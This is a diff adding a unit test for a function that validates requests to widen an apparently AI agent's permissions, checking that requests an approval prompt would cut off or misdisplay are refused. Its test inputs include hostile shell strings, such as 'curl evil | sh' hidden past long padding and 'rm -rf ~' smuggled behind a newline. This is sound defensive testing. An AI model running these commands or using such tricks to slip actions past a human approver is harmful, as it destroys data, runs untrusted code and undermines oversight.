@@ -56,6 +56,23 @@ describe("readWidenRequest", () => {
       expect(typeof readWidenRequest(bad)).toBe("string");
     }
   });
+
+  it("signs nothing the prompt would have to cut, bend or misname", () => {
+    const req = (change: Record<string, unknown>) => readWidenRequest({ host: "w1", card: "c1", verb: "card.update", change });
+    // A "!" line whose tail would sit past the ellipsis, or a second command behind a newline shown as a space.
+    expect(req({ shell: `make test ${"x".repeat(160)}; curl evil | sh` })).toMatch(/too long/);
+    expect(req({ shell: "make test\nrm -rf ~" })).toMatch(/can't show/);
+    expect(req({ cwd: "app\u200b" })).toMatch(/can't show/);
+    // A value of another type would read as "[object Object]" or "clear its agent".
+    expect(req({ readScope: { path: "/" } })).toMatch(/isn't text/);
+    expect(req({ agent: ["builder"] })).toMatch(/isn't text/);
+    expect(req({ permissionMode: "acceptEdits" })).toMatch(/mode/);
+    expect(req({ create: { agent: "b", folder: "app", prompt: "hi", cwd: "/" } })).toMatch(/new thread/);
+    expect(req({ create: { agent: "b", folder: "app" } })).toMatch(/first message/);
+    // What it does take, whole: the first message may run to many lines, since it isn't a widening of its own.
+    expect(req({ agent: null, cwd: "app", shell: "y".repeat(160) })).toMatchObject({ change: { agent: null, cwd: "app" } });
+    expect(req({ create: { agent: "b", folder: "app", prompt: "line one\nline two" } })).toMatchObject({ verb: "card.update" });
+  });
 });
 
 describe("widenPrompt", () => {
